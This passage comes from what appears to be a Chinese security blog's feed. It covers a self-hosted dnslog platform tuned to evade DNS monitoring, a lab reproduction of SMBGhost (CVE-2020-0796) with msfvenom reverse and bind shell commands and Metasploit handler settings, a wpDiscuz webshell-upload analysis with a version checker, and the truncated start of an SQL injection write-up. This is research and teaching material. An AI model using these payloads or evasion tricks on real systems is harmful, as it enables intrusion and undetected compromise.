        <content type="html"><![CDATA[<p>&emsp;&emsp;在蓝军防守过程中，遇到一些告警的流量中，出现很明显的dnslog平台的痕迹，比如：验证fastjson时，payload时xxx.dnslog.cn，这种流量会直接触发反序列化攻击的攻击，那么对于这个攻击的防护算检测到了，但是如果使用一些编码绕过了流量的识别呢？实际上越来越多的安全监控将dnslog.cn、ceye.io加入到针对dns流量的分析中；一次真实的溯源工作中，我们通过ceye.io的id找到了真实的攻击者，这表示公用的dnslog平台已经不能用来做更加隐蔽攻击探测。<br>&emsp;&emsp;实际上很多的团队已经自己搭建dnslog平台，或将dnlog功能加入到自建的安全攻击平台中。</p><p>一个简单、实用、安全的dnslog平台有哪些需求呢？</p><ul><li>方便启动</li><li>账号分权</li><li>管理端的安全性</li><li>域名更隐蔽<br>…</li></ul><h3 id="选取一套合适的开源代码"><a href="#选取一套合适的开源代码" class="headerlink" title="选取一套合适的开源代码"></a>选取一套合适的开源代码</h3><p>&emsp;&emsp;有精力的话，可以自己从开始编写代码，但是这样有点耗费时间，github上已经有很多开源的项目，这里挑出来3个。</p><blockquote><p>java版本：<br><a href="https://github.com/SPuerBRead/Bridge">https://github.com/SPuerBRead/Bridge</a><br>python版本：<br><a href="https://github.com/BugScanTeam/DNSLog">https://github.com/BugScanTeam/DNSLog</a><br>golang版本：<br><a href="https://github.com/chennqqi/godnslog">https://github.com/chennqqi/godnslog</a><br>我选择了SPuerBRead的Bridge，功能介绍可以参考该项目的readme。</p></blockquote><h3 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h3><p>&emsp;&emsp;SPuerBRead的这台平台已经可以做到很方便的启动、dnslog、httplog的记录功能了，但是对于自己使用起来，还有一些小需求，于是做了一些的修改。<br>如下是一些想法和作出的改动</p><h5 id="Q1：启动后登录，注册的用户会生成logid字段，该字段是数字类型，值是1、2、3、4-。。。，这样导致用户的dnslog验证的payload地址是这样的："><a href="#Q1：启动后登录，注册的用户会生成logid字段，该字段是数字类型，值是1、2、3、4-。。。，这样导致用户的dnslog验证的payload地址是这样的：" class="headerlink" title="Q1：启动后登录，注册的用户会生成logid字段，该字段是数字类型，值是1、2、3、4 。。。，这样导致用户的dnslog验证的payload地址是这样的："></a>Q1：启动后登录，注册的用户会生成logid字段，该字段是数字类型，值是1、2、3、4 。。。，这样导致用户的dnslog验证的payload地址是这样的：</h5><p>xxx.1.dnslog.com<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E4%BF%AE%E6%94%B9%E5%89%8D.jpg" alt="修改前"><br>这样对于监控来说，很可能会觉得如果有内网解析这样的dns请求是很奇怪的。<br><strong>A：</strong>修改了用户logid字段类型为varchar类型，在注册用户是生成为随机的4位字符。<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E4%BF%AE%E6%94%B9%E5%90%8E.jpg" alt="修改后"></p><h5 id="Q2：原程序中任何子域的解析请求都会响应并记录到数据库中，这样一旦遇到爆破dns记录的情况，会导致数据库中大量垃圾数据。"><a href="#Q2：原程序中任何子域的解析请求都会响应并记录到数据库中，这样一旦遇到爆破dns记录的情况，会导致数据库中大量垃圾数据。" class="headerlink" title="Q2：原程序中任何子域的解析请求都会响应并记录到数据库中，这样一旦遇到爆破dns记录的情况，会导致数据库中大量垃圾数据。"></a>Q2：原程序中任何子域的解析请求都会响应并记录到数据库中，这样一旦遇到爆破dns记录的情况，会导致数据库中大量垃圾数据。</h5><p>A2：在返回解析结果时检查库中是否有request对应logid，如果不存在则不响应任何内容</p><h5 id="Q3：对web访问做限制，只有自己或小伙伴可以访问管理端。"><a href="#Q3：对web访问做限制，只有自己或小伙伴可以访问管理端。" class="headerlink" title="Q3：对web访问做限制，只有自己或小伙伴可以访问管理端。"></a>Q3：对web访问做限制，只有自己或小伙伴可以访问管理端。</h5><p>A2：自定义header字段的判断，只放过自定义header验证正确的请求，有关Header-Signal的值，可以指定springboot启动参数位置自定义。<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E8%87%AA%E5%AE%9A%E4%B9%89header%E6%AD%A3%E7%A1%AE%E7%9A%84%E8%AF%B7%E6%B1%82.jpg" alt="自定义header正确的请求"></p><p><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E8%87%AA%E5%AE%9A%E4%B9%89header%E9%94%99%E8%AF%AF%E7%9A%84%E8%AF%B7%E6%B1%82.jpg" alt="自定义header错误的请求"></p><p>其他也更新了一些小功能，比如logid的显示，dnslog界面显示payload等。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>启动参数可以参考帮助信息或项目readme</p><blockquote><p>这里有一个有意思的地方：在网上看过几片文章，有些写着需要两个域名来实现自定义解析的功能，这里试验了一下，其实使用一个域名服务就可以实现。</p></blockquote><p>首先我们看下两个域名的一个解析流程<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E4%B8%A4%E4%B8%AA%E5%9F%9F%E5%90%8D%E7%9A%84%E9%85%8D%E7%BD%AE.jpg" alt="两个域名的解析流程"></p><p>实际上，一个域名也可以配置<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/dns%E9%85%8D%E7%BD%AE%E6%88%AA%E5%9B%BE.jpg" alt="-w1001"></p><p>这样的解析过程就可以依靠一个域名、一个vps完成。<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8D%E7%9A%84%E9%85%8D%E7%BD%AE.jpg" alt="一个域名的解析过程"><br>从dns解析的trace也可以清晰的看到解析路径。<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/dnsTrace.jpg" alt="dnstrace"><br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/16206419670337.jpg" alt="-w1144"></p><p>搭建完了才发现，原作者也是一个域名。。。</p><h3 id="end"><a href="#end" class="headerlink" title="end"></a>end</h3><p>&emsp;&emsp;还有一个小思路，现在很多dnslog平台，在返回解析记录时，将所有解析记录都指向127.0.0.1，对于安全监控来说，完全可以在针对dns流量的审计中，增加判断，当检测到存在127.0.0.1的response返回包时，触发告警疑似dnslog请求。所以在搭建的时候，配置平台默认返回的解析结果尽量指定一个可信的公网ip。</p><blockquote><p>项目源代码上传至：<a href="https://github.com/ninefiger/dnslogPt">https://github.com/ninefiger/dnslogPt</a><br>感谢原版作者：<a href="https://github.com/SPuerBRead/Bridge">https://github.com/SPuerBRead/Bridge</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 攻防研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win10—SMB3_CVE-2020-0796复现</title>
      <link href="/2020/11/22/win10%E2%80%94SMB3-CVE-2020-0796%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/11/22/win10%E2%80%94SMB3-CVE-2020-0796%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><ol><li>环境<ul><li>被攻击点：Microsoft Windows 10（1903）- 192.168.0.26</li><li>攻击机：kali - 192.168.0.23</li></ul></li><li>工具<ul><li>SMBGhost_RCE_PoC （<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC%EF%BC%89">https://github.com/chompie1337/SMBGhost_RCE_PoC）</a></li><li>Metasploit （kali）</li></ul></li></ol><h3 id="0x02-扫描确认漏洞是否存在"><a href="#0x02-扫描确认漏洞是否存在" class="headerlink" title="0x02 扫描确认漏洞是否存在"></a>0x02 扫描确认漏洞是否存在</h3><p>​        直接使用奇安信的扫描工具，扫描目标系统是否存在漏洞。</p><p>下载链接：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a> </p><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F.jpg" alt="扫描目标系统"></p><h3 id="0x03-生成payload并攻击"><a href="#0x03-生成payload并攻击" class="headerlink" title="0x03 生成payload并攻击"></a>0x03 生成payload并攻击</h3><ol><li><p>msf正向连接Shell</p><p>a. 生成payload</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=81 -b <span class="string">&#x27;\x00&#x27;</span> -f python</span><br></pre></td></tr></table></figure><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5payload.jpg" alt="生成payload1"></p><p>​        b. 复制buf，修改SMBGhost_RCE_PoC中USER_PAYLOAD变量为payload</p><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E6%9B%BF%E6%8D%A2exploit.py.jpg" alt="修改exp"></p><p>​        c. msf开启监听</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">81</span></span><br><span class="line"><span class="built_in">set</span> RHOST <span class="number">192.168</span><span class="number">.0</span><span class="number">.26</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>​        d. 运行exploit.py，发送payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -ip 192.168.0.26</span><br></pre></td></tr></table></figure><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E6%AD%A3%E5%90%91getshell.jpg" alt="正向getshell"></p><ol start="2"><li><p>msf反向反弹Shell</p><p>a. 生成payload</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.23 LPORT=80 -b <span class="string">&#x27;\x00&#x27;</span> -f python</span><br></pre></td></tr></table></figure><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5payload.png" alt="生成payload1"></p><p>​        b. 修改SMBGhost_RCE_PoC中USER_PAYLOAD变量</p><p>​        c. msf开启监听</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">80</span></span><br><span class="line"><span class="built_in">set</span> LHOST <span class="number">192.168</span><span class="number">.0</span><span class="number">.23</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>​        d. 运行exploit.py，发送payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -ip 192.168.0.26</span><br></pre></td></tr></table></figure><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E5%8F%8D%E5%90%91getshell.jpg" alt="反向getshell"></p><h3 id="0x04-小坑和总结"><a href="#0x04-小坑和总结" class="headerlink" title="0x04 小坑和总结"></a>0x04 小坑和总结</h3><ol><li>可以根据实际情况生成payload，即实际网络环境来决定正向还是反向，大多数内网环境由于NAT转换和边界防火墙导致不能直接访问内网的服务，还是建议用反向的将目标权限反弹出来。</li><li>测试的时候目标机器在另一台物理机，本来想远程上去，一起截图证明一下，后台发现，远程的时候，发送反向的payload会导致蓝屏，具体原因没分析。</li><li>测试了Cobalt Strike生成的payload，一打就蓝屏，原因不知道，但是还是希望能用cs搞，cs还是好用些。</li></ol>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> 远程代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordpress评论插件wpDiscuz任意文件上传漏洞分析</title>
      <link href="/2020/08/10/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2020/08/10/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​&nbsp;&nbsp;在t00ls上看到某wordpress站点被上传webshell，下载了access日志分析了一下，判断攻击路径：访问了某页面后 -&gt; 访问了/wp-admin/admin-ajax.php?action=wmuUploadFiles接口 -&gt; 访问webshell，因此确定是这个模块有问题；官网显示V7.0.5修复了一次安全漏洞，于是下载V7.0.3版本学习一下（7.0.4没找到）。</p><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1.png" alt="1"></p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul><li>php 5.6.40</li><li>mysql 5.7.26</li><li>Phpstorm</li><li>Wordpress 5.4.1 + wpdiscuz V 7.0.3</li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol><li>环境搭建后，手动安装wpdiscuz插件后，看到文章下增加评论模块</li></ol><img src="/img/wordpress评论插件wpDiscuz任意文件上传漏洞分析/2.png" alt="16" style="zoom: 33%;" /><ol start="2"><li>phpstorm导入web目录，点击图片按钮，上传一个php文件测试一下，上传路径是<a href="http://127.0.0.1:8888/wordpress/wp-admin/admin-ajax.php%EF%BC%8C%E9%BB%98%E8%AE%A4%E6%98%AF%E4%B8%8A%E4%BC%A0%E4%B8%8D%E4%BA%86%E7%9A%84%E3%80%82">http://127.0.0.1:8888/wordpress/wp-admin/admin-ajax.php，默认是上传不了的。</a></li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3.png" alt="3"></p><ol start="3"><li>从入口点分析，如图是wp_filter的action过滤</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4.png" alt="4"></p><ol start="4"><li>跟进去，可以看到上传的功能点，再进去</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png" alt="5"></p><ol start="5"><li>可以看到如图位置，使用getMimeType方法根据文件内容获取文件类型，并不是通过文件后缀名判断，进一步根据$mineType判断是否是允许的上传类型。</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6.png" alt="6"></p><ol start="6"><li>跟入查看isAllowedFileType方法，在判斷$mineType是否在$this -&gt; options -&gt; content[“wmuMimeTypes”]中存在。</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7.png" alt="7"></p><ol start="7"><li>如图，进入$options中，可以content[“wmuMimeTypes”]使用三目运算判断，搜索上下文得知，结果就是$defaultOptions[self::TAB_CONTENT][“wmuMimeTypes”]</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8.png" alt="8"></p><ol start="8"><li>进入$defaultOptions中可以得到最终$this -&gt; options -&gt; content[“wmuMimeTypes”]的值是几种常见的图片类型。</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/9.png" alt="9"></p><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/10.png" alt="10"></p><ol start="9"><li>很明显此时文件类型已经通过getMimeType()方法修改为text/plain了，但是回到进入isAllowedFileType的代码，发现程序只在此处对上传文件进行了判断后，直接保存了文件。</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/11.png" alt="11"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>如此，程序只是根据文件内容判断文件类型，并未对文件后缀进行效验，构造一个图片马，或者手动在webshell前面加上图片头信息即可绕过。</p><ol><li>把后门文件追加到图片后</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/12.png" alt="12"></p><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/13.png" alt="13"></p><ol start="2"><li>上传并修改后缀名为php，可以看到返回路径</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/14.png" alt="14"></p><ol start="3"><li>连接webshell</li></ol><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/15.png" alt="15"></p><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>​        在装上wpdiscuz插件后，每个文章中都会带有如下标签信息，且带有版本号，可利用此特征编写脚本。</p><p><img src="/img/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16.png" alt="16"></p><h3 id="check-version-demo"><a href="#check-version-demo" class="headerlink" title="check version demo"></a>check version demo</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wpdiscuz</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.s = requests.session()</span><br><span class="line">        self.s.headrs = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>:</span><br><span class="line">            <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Edg/80.0.361.66&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.nonce = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.state = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self, url</span>):</span></span><br><span class="line">        res = self.s.get(url=url)</span><br><span class="line"></span><br><span class="line">        pat1 = <span class="string">&quot;wpdiscuz/themes/default/style\.css\?ver=(.*?)&#x27;&quot;</span></span><br><span class="line">        reSearch1 = re.search(pat1, res.text)</span><br><span class="line">        <span class="keyword">if</span> reSearch1 == <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s 评论插件不存在任意文件漏洞&quot;</span> % url) </span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        mess = reSearch1.group(<span class="number">0</span>)</span><br><span class="line">        version = reSearch1.group(<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># 判断版本</span></span><br><span class="line">        vers = version.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">len</span>(vers) == <span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(vers[<span class="number">0</span>]) == <span class="number">7</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">int</span>(vers[<span class="number">2</span>]) &lt;= <span class="number">4</span>:</span><br><span class="line">                    <span class="built_in">print</span>(url + <span class="string">&quot; 存在任意文件上传漏洞 wpdiscuz版本为 %s&quot;</span> % version)</span><br><span class="line">                    self.state = <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> self.state == <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># nonce</span></span><br><span class="line">            pat2 = <span class="string">&#x27;&quot;wmuSecurity&quot;:&quot;(.*?)&quot;&#x27;</span></span><br><span class="line">            reSearch2 = re.search(pat2, res.text)</span><br><span class="line">            nonce = reSearch2.group(<span class="number">1</span>)</span><br><span class="line">            self.nonce = nonce</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s 评论插件不存在任意文件漏洞&quot;</span> % url)    </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">self, url, project, filepath</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    wpdiscuz = wpdiscuz()</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;检测漏洞结果:&quot;</span>)</span><br><span class="line">    wpdiscuz.check(url)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码分析 </tag>
            
            <tag> 漏洞预警 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次sm4前端参数加密下的sql盲注</title>
      <link href="/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/"/>
      <url>/2020/05/01/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><hr><p>&emsp;&emsp;在一次授权渗透测试中，应用在前端使用sql语句拼接方式传送参数，很明显存在sql注入，提交漏洞后，用户大概不想重构项目，于是将前端参数传输前均进行加密，但是通过JS找到加密密钥后，结合py脚本还是注入了；后续用户再次升级将设计加密的JS也加密混淆了，不过还有办法找到密钥，借此分享，过程中踩坑绕弯，欢迎大表哥们交流指导。</p><h3 id="0x01-第一次常规测试"><a href="#0x01-第一次常规测试" class="headerlink" title="0x01 第一次常规测试"></a>0x01 第一次常规测试</h3><ol><li><p>如下图点击功能抓数据包，可以发现参数中明显有SQL语句，后使用1=1 和 1=2 确定了注入点，但是没有返回值，只能盲注了。。<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/00-%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B8%B8%E8%A7%84%E6%B5%8B%E8%AF%95.png" alt="00-第一次常规测试"></p></li><li><p>py写个脚本，简单爆破了一下数据库长度、数据库名等信息<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/01-%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%84%9A%E6%9C%AC%E7%9B%B2%E6%B3%A8.png" alt="01-第一次脚本盲注"></p></li></ol><h3 id="0x02-第二次参数使用SM4加密"><a href="#0x02-第二次参数使用SM4加密" class="headerlink" title="0x02 第二次参数使用SM4加密"></a>0x02 第二次参数使用SM4加密</h3><ol><li><p>接到复测通知，看了下系统，发现参数被加密了，如下图<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/02-%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86.png" alt="02-第二次参数加密"></p></li><li><p>这里找加密方法的图没截，大概就是找到对应的ajax方法，可以看到md5_bean参数的生成通过base.js的encryptData_ECB方法生成，打开base.js清晰可见sm4字样以及secretkey和iv，如下图<br><img src="/img/%E4%B8%80%E6%AC%A1sm4%E5%89%8D%E7%AB%AF%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%8B%E7%9A%84sql%E7%9B%B2%E6%B3%A8/03-%E6%89%BE%E5%88%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95.png" alt="03-找到加密算法"></p></li><li><p>接下来是如何注入，本来想构造一个sqlmap的tamper脚本，但是发现这个是把所有参数一起加密了，没得思路了，于是还是用py写盲注脚本吧，但是网上找的python实现sm4加密的结果都不一样，考虑到这个后台是java的，肯定是java做的解密，于是找了java的sm4实现，试了一下，结果可以了，于是尝试用py调用打包好的jar包进行注入（这里绕了一个大圈，实际上使用py调用js就行，第三次测试的时候更新了）</p></li></ol><p><img 